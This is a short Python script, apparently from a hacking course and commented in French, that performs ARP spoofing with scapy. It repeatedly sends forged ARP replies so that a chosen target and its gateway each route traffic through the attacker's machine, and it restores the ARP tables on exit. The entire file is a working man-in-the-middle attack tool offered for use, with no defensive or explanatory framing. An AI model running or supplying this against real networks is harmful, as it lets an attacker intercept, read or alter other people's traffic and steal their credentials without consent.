#!/usr/bin/env python
import scapy.all as scapy
import argparse
import time
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    return parser.parse_args()

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet

    answered_list = scapy.srp(arp_broadcast_packet, timeout=2, verbose=False)[0]
    #print(answered_list[0][1])
    while not answered_list:
        answered_list = scapy.srp(arp_broadcast_packet, timeout=2, verbose=False)[0]
        #print(answered_list)
        print(answered_list.show())

    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, 4)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #on envoi un message a la victime target_ip soit disant venant de smoof_ip
    #sashant que derriere notre @ mac sera déposé comme l'@ mac de l'@ ip smoof_ip
    scapy.send(packet, verbose=False)


arguments = get_arguments()
sent_packets = 0

try:
    while True: # on doit en envoyer beaucoup et à intervalle de temps
        spoof(arguments.target, arguments.gateway) # on se fais passer pour la passerelle au niveau de la victime
        spoof(arguments.gateway, arguments.target) # on se fais passer pour la victime au niveau de la passerelle
        sent_packets+=2
        print("[+] packets envoyés: " + str(sent_packets), end="\r", flush=True)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Ctrl + C detecté.....Restoration des Tables ARP. Please Wait!")
    restore(arguments.target,arguments.gateway)
    restore(arguments.gateway, arguments.target)
except IndexError:
    print("\n une erreur c'est produite. Une résolution d'adresse n'a pas fonctionné.")